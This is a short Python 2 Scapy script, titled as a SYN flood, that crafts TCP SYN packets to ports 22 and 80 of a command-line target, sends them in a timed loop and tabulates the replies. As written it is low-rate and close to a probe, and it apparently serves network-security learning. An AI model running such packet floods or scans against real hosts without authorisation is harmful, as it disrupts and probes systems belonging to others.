#! /usr/bin/env python
# SYN Flood Packet with Scapy 
import sys
from scapy.all import *
#conf.verb=0
print "Field Values of packet sent"
p=IP(dst=sys.argv[1],id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"Security Please"
ls(p)
print "Sending Packets in 0.5 second intervals for timeout of 5 sec"
ans,unans=srloop(p,inter=0.5,retry=2,timeout=5)
print "Summary of answered & unanswered packets"
ans.summary()
unans.summary()
print "source port flags in response"
#for s,r in ans:
# print r.sprintf("%TCP.sport% \t %TCP.flags%")
ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
